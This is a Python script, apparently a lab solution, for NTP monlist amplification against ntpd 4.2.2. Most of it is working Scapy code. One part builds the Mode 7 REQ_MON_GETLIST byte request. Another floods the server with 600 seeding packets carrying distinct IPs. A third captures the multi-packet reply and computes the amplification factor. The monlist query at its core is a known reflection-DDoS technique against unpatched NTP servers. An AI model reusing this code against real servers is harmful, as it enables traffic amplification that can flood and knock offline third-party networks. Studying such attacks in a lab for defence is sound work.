#!/usr/bin/env python3
"""
NTP lab solution: monlist amplification against ntpd 4.2.2.

Idea
----
ntpd <= 4.2.7 answers the Mode 7 (private) request REQ_MON_GETLIST (code 42),
"monlist", with its monitor list: up to 600 recently-seen clients, 72 bytes
each, split across many ~482-byte UDP packets. A tiny request -> huge reply.

The monitor list starts empty (and is wiped every ~12s when the server is
cycled), so on its own monlist returns almost nothing. We first *seed* the
list by sending many "TimeRequest [IP]" commands, each with a different IPv4
address. Every unique IP becomes an entry in the monitor list. Then a single
small monlist query pulls all of them back.

Seed + query must happen inside one uptime window, so we do it fast and retry.
"""

from scapy.all import IP, UDP, Raw, sr1, send, conf
import ipaddress
import sys

TARGET = "CHANGE_ME"   # NTP server host/IP for your lab
PORT   = 123
conf.verb = 0

# --- building blocks --------------------------------------------------------

def time_request(ip_str):
    """Custom plaintext command that injects a client IP into the monitor list."""
    payload = f"TimeRequest {ip_str}".encode()
    return IP(dst=TARGET) / UDP(sport=0xdead, dport=PORT) / Raw(load=payload)

def monlist_request():
    """
    Mode 7 REQ_MON_GETLIST_1 ("monlist").

    byte0 = 0x17 -> Response=0, More=0, Version=2 (010), Mode=7 (111)
    byte1 = 0x00 -> Auth=0, Sequence=0
    byte2 = 0x03 -> implementation = IMPL_XNTPD
    byte3 = 0x2a -> request code 42 = REQ_MON_GETLIST_1 (monlist)
    rest  = err/nitems, mbz/itemsize, zeroed data.
    Padded to 48 bytes to satisfy the minimum-length check.
    """
    hdr = b"\x17\x00\x03\x2a"
    body = hdr + b"\x00" * (48 - len(hdr))
    return IP(dst=TARGET) / UDP(sport=0xbeef, dport=PORT) / Raw(load=body)

# --- seeding ----------------------------------------------------------------

def seed_monitor_list(count=600, base="203.0.113.0"):
    """
    Fire `count` TimeRequest commands with distinct IPs to fill the monitor
    list. 600 is ntpd's MON_LIST max; filling it maximizes the reply.
    """
    start = int(ipaddress.IPv4Address(base))
    pkts = [time_request(str(ipaddress.IPv4Address(start + i))) for i in range(count)]
    send(pkts, inter=0)          # blast them out; no replies needed
    print(f"[*] seeded {count} IPs into the monitor list")

# --- amplification measurement ---------------------------------------------

def run():
    req = monlist_request()
    req_bytes = len(bytes(req[UDP].payload))

    seed_monitor_list()

    # monlist replies with MANY packets. sr1 only grabs the first, so sniff all.
    from scapy.all import AsyncSniffer
    sniffer = AsyncSniffer(
        filter=f"udp and src host {TARGET} and src port {PORT}",
        store=True,
    )
    sniffer.start()
    send(req)
    import time; time.sleep(3)      # let all fragments/packets arrive
    resp = sniffer.stop()

    resp_bytes = sum(len(bytes(p[UDP].payload)) for p in resp if p.haslayer(UDP))
    print(f"[*] request payload : {req_bytes} bytes")
    print(f"[*] reply payload   : {resp_bytes} bytes across {len(resp)} packets")
    if req_bytes:
        print(f"[*] amplification   : {resp_bytes / req_bytes:.1f}x")

if __name__ == "__main__":
    if TARGET == "CHANGE_ME":
        sys.exit("Set TARGET to your lab's NTP server first.")
    run()
